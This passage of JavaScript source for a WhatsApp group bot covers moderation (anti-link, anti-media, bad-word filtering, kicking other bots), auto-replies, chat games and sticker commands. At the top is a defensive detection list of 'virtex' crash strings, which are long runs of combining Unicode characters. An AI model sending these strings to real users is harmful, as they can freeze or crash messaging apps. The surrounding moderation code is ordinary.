if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return reply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
nyanBot2.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(isSamu) return
nyanBot2.groupParticipantsUpdate(from, [sender], 'remove')
await nyanBot2.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
nyanBot2.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmin || !isBotAdmin){		  
        } else {
          reply(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await nyanBot2.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isAntiMedia) {
    if(isAntiMedia === "imageMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isAntiMedia) {
    if(isAntiMedia === "videoMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isAntiMedia) {
    if(isAntiMedia === "stickerMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isAntiMedia) {
    if(isAntiMedia === "audioMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isAntiMedia) {
    if(isAntiMedia === "pollCreationMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isAntiMedia) {
    if(isAntiMedia === "locationMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isAntiMedia) {
    if(isAntiMedia === "documentMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isAntiMedia) {
    if(isAntiMedia === "contactMessage"){
        if (isSamu || isAdmins || !isBotAdmins){		  
        } else {
          reply(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return nyanBot2.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  nyanBot2.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			nyanBot2.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                nyanBot2.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                nyanBot2.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isSamu) return reply(bvl)
               await nyanBot2.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			nyanBot2.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isSamu) return reply(bvl)
               await nyanBot2.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			nyanBot2.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            reply(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            reply(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const xeonfeature = () =>{
            var mytext = fs.readFileSync("./XeonCheems11.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        //autoreply
for (let BhosdikaXeon of VoiceNoteNyan) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./Media/audio/${BhosdikaXeon}.mp3`)
nyanBot2.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of Stickers){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./Media/sticker/${BhosdikaXeon}.webp`)
nyanBot2.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageNyan){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./Media/image/${BhosdikaXeon}.jpg`)
nyanBot2.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoNyan){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./Media/video/${BhosdikaXeon}.mp4`)
nyanBot2.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
nyanBot2.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaXeon of ApkNyan) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Media/apk/${BhosdikaXeon}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
nyanBot2.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaXeon of ZipNyan) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Media/zip/${BhosdikaXeon}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
nyanBot2.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaXeon of DocNyan) {
if (budy === BhosdikaXeon) {
let buffer = fs.readFileSync(`./Media/doc/${BhosdikaXeon}.pdf`)
senddocu(buffer)
}
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
    userJid: nyanBot2.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, nyanBot2.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
nyanBot2.ev.emit('messages.upsert', msg)
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd2) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else reply('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                reply({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
            let winner = isSurrender ? room.game.currentTurn : room.game.winner
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Type *surrender* to surrender and admit defeat`
            if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
                room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (room.x !== room.o) nyanBot2.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            nyanBot2.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete this.game[room.id]
            }
        }
        
        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    nyanBot2.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    nyanBot2.sendText(m.chat, `Suit has been sent to chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please choose a suit in the respective chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) nyanBot2.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
	    if (!roof.pilih2) nyanBot2.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) nyanBot2.sendText(m.chat, `Both Players Don't Want To Play,\nSuit Canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    nyanBot2.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Didn't Choose Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /scissors/i
	    let b = /rock/i
	    let k = /paper/i
	    let reg = /^(scissors|rock|paper)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) nyanBot2.sendText(roof.p2, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\nWaiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) nyanBot2.sendText(roof.p, '_The opponent has chosen_\nNow it is your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    nyanBot2.sendText(roof.asal, `_*Suit Results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
        
        //user db
        if (isCommand && !isUser) {
verifieduser.push(sender)
fs.writeFileSync('./src/data/role/user.json', JSON.stringify(verifieduser, null, 2))
}
        
        switch (isCommand) {




            case 'test':
let x = async (jid, buttons = [], quoted = {}, opts = {}, options = {}) => {
    var prepare = {}
      const message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
                  header: {
                     ...(opts.header ? { title: opts.header } : {}),
                     hasMediaAttachment: opts.media ? true : false,
                     ...prepare
                  },
                  body: {
                     text: opts.content ? opts.content: ''
                  },
                  nativeFlowMessage: {
                     buttons,
                     messageParamsJson: ''
                  },
                  contextInfo: {
                     mentionedJid: opts.mention,
                     remoteJid: opts.from || null,
                     forwardingScore: opts && opts.forScore ? opts.forScore : 0,
                     isForwarded: opts && opts.forward ? opts.forward : false,
                     ...(opts.business ? {
                        businessMessageForwardInfo: {
                           businessOwnerJid: nyanBot2.user.from
                        }
                     } : {})
                  }
               }
            }
         }
      }, {
         userJid: nyanBot2.user.from,
         quoted
      })
      nyanBot2.relayMessage(from, message['message'], {
         messageId: message.key.id
      })
      return message
   }

const buttons = [{
          name: "cta_url",
          buttonParamsJson: JSON.stringify({
            display_text: 'Go to My Page! 🪅',
            url: 'wa.me/samu330'
          }),
        }]
        return await x(m.from, buttons, m, {
          content: 'hola'
        })
            break

            case 'play': case 'song': {
                if (!text) return reply(`Ejemplo: ${prefix + command} anime whatsapp status`);
            
                try {
			await loading()
                    const r = await yts(text);
            
                    if (!r || !r.videos || r.videos.length === 0) {
                        return reply("No se encontraron videos para esa búsqueda.");
                    }
            
                    const video = r.videos[0];
                    const videoId = video.videoId;
            
                    const rapiInstance = new Rapi();
                    const videoData = await rapiInstance.fetchVideoData(videoId); // Obtener datos de la API
            
                    // Obtener los datos necesarios
                    const title = videoData.title; // Título del video
                    const channel = videoData.channelTitle; // Canal del video
                    const lengthSeconds = videoData.lengthSeconds; // Duración en segundos
                    const views = videoData.viewCount ? videoData.viewCount : "No disponible"; // Cantidad de vistas
                    const publishDate = new Date(videoData.publishDate); // Fecha de publicación
                    const category = videoData.category; // Categoría del video
                    const thumbnail = videoData.thumbnail[1].url; // Obtener la segunda imagen del thumbnail
            
                    // Obtener la calidad, tamaño y URL directamente de la respuesta de la API
                    const formatData = videoData.formats[0]; // Tomar el primer formato como ejemplo
                    const quality = formatData.qualityLabel; // Calidad
                    const size = formatData.contentLength; // Tamaño
                    const url = formatData.url; // URL de descarga
            
                    // Formatear la duración a minutos y segundos
                    const formattedDuration = `${Math.floor(lengthSeconds / 60)}:${(lengthSeconds % 60).toString().padStart(2, '0')}`; // Duración formateada
            
                    // Formatear la fecha a una cadena legible
                    const formattedDate = publishDate.toLocaleDateString("es-ES", {
                        year: 'numeric',
                        month: 'long',
                        day: 'numeric'
                    });
            
                    // Crear la respuesta formateada
                    const formattedResponse = `*Título:* ${title}
*Canal:* ${channel}
*Duración:* ${formattedDuration}
*Calidad:* ${quality}
*Tamaño:* ${size} bytes
*Vistas:* ${views.toLocaleString()} vistas
*Fecha de Publicación:* ${formattedDate}
*Categoría:* ${category}}`;
            
                    reply(formattedResponse); // Enviar la respuesta formateada
                } catch (e) {
                    reply(`Error: ${e.message}`);
                }
            }
            break

            case 's': case 'sticker': case 'stiker': {
                if (!quoted) return reply(`Envia o etiqueta una Imagen/Video/gif con el comando ${prefix+command}\nVDuración del video de 1-9 Segundos.`)
                if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await nyanBot2.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return reply('Envia o etiqueta una Imagen/Video/gif con el comando ${prefix+command}\nVideo Duration 1-9 Seconds')
                let media = await quoted.download()
                let encmedia = await nyanBot2.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                } else {
                reply(`Envia o etiqueta una Imagen/Video/gif con el comando ${prefix+command}\nVideo Duration 1-9 Seconds`)
                }
                }
                break

case 'actualizar':
case 'update':
if (!isSamu) return reply('tu quien eres para decirme que hacer!?🤔')
reply('*ESPERE UN MOMENTO... EL BOT ESTA SIENDO ACTUALIZADO CON LAS ÚLTIMAS MODIFICACIONES*')
exec(`bash update.sh`, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) reply(`*El bot se ah actualizado!*\nInforme de la actualización:\n\n${stdout}\n\n> *NyanBot-V2*`)
})
break



            case 'puntos':
                const puntos = getUserPoints(sender);
                reply(`Total de puntos: ${puntos}`);
            break

            case 'llaves': // Comando para ver el uso de claves
    const usageDataFilePath = path.join(__dirname, './Media/database/usage.json'); // Ruta del archivo de uso

    if (fs.existsSync(usageDataFilePath)) {
        const usageData = JSON.parse(fs.readFileSync(usageDataFilePath)); // Cargar datos de uso

        let message = '*Usos de las claves:*\n\n'; // Mensaje para enviar

        // Iterar sobre las claves y agregar su uso al mensaje
        for (const key of Object.keys(usageData.keys)) {
            const keyInfo = usageData.keys[key];
            const formattedLastReset = new Date(keyInfo.lastReset).toLocaleString('es-ES', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false // Para usar el formato de 24 horas
            });

            message += `*Clave:* ${key}, *Usos:* ${keyInfo.usage}, *Último reinicio:* ${formattedLastReset}\n`;
        }

        reply(message); // Enviar el mensaje con la información de uso
    } else {
        reply("El archivo de uso no existe."); // Mensaje si el archivo no se encuentra
    }
    break
    break

            case 'addsticker':{
                if (!isSamu) return StickOwner()
                if (args.length < 1) return reply('Whats the sticker name?')
                if (Stickers.includes(q)) return reply("The name is already in use")
                let delb = await nyanBot2.downloadAndSaveMediaMessage(quoted)
                Stickers.push(q)
                await fsx.copy(delb, `./Media/sticker/${q}.webp`)
                fs.writeFileSync('./Media/database/stickers.json', JSON.stringify(Stickers))
                fs.unlinkSync(delb)
                reply(`Se añadio el Sticker.\nPara ver lo Stickers añadidos usa: *${prefix}liststicker*`)
                }
                break

                case 'liststicker':{
                    let teks = '*Lista de Stickers*\n\n'
                    for (let x of Stickers) {
                    teks += `- ${x}\n`
                    }
                    teks += `\n\n*Total de Stickers : ${Stickers.length}*`
                    reply(teks)
                    }
                    break

                    case 'delsticker':{
                        if (!isSamu) return StickOwner()
                        if (args.length < 1) return reply('Enter the sticker name')
                        if (!Stickers.includes(q)) return reply("The name does not exist in the database")
                        let wanu = Stickers.indexOf(q)
                        Stickers.splice(wanu, 1)
                        fs.writeFileSync('./Media/database/stickers.json', JSON.stringify(Stickers))
                        fs.unlinkSync(`./Media/sticker/${q}.webp`)
                        reply(`Success deleting sticker ${q}`)
                        }
                        break

            /*
            case 'addbadword': case 'addbd':
               if (!isSamu) return StickOwner()
               if (!groupAdmins) return reply(mess.admin)
               if (args.length < 1) return reply( `Send command ${prefix}addbadword [harsh word]. Example ${prefix}addbadword asshole`)
               bad.push(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               reply('Successfully Added Bad Word!')
            break
            case 'delbadword': case 'deldb':
               if (!isSamu) return StickOwner()
               if (!groupAdmins) return reply(mess.admin)
               if (args.length < 1) return reply( `Send commands ${prefix}addbadword [bad word]. Example ${prefix}addbadword asshole`)                 
               bad.splice(q)
               fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad))
               reply('Successfully Deleted Bad Word!')
            break 
            case 'resetuser':
            case 'resetdbuser': {
               if (!isSamu) return StickOwner()
               let totalusernya = db.data.users[0]
               reply(`Succesfully Deleted ${totalusernya} Users in Database`)
               db.data.users = []
            }
            break
            case 'resethit':
            case 'resettotalhit': {
               if (!isSamu) return StickOwner()
               global.db.data.settings[botNumber].totalhit = 0
               reply(mess.done)
            }
            break
            case 'setmenu':{
               if (!isSamu) return StickOwner()
               if (!text) return reply(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
               if (text.startsWith('v')) {
                  typemenu = text
                  reply(mess.done)
               } else {
                  reply(`There are 8 menu(v1,v2,v3,v4,v5,v6,v7,v8)\nPlease select one\nExample ${prefix + command} v1`)
               }
            }
            break
            case 'setreply':{
               if (!isSamu) return StickOwner()
               if (!text) return reply(`There are 3 reply(v1,v2,v3)\nPlease select 1\nExample ${prefix+command} v1`)
               if (text.startsWith('v')) {
                  typereply = text
                  reply(mess.done)
               } else {
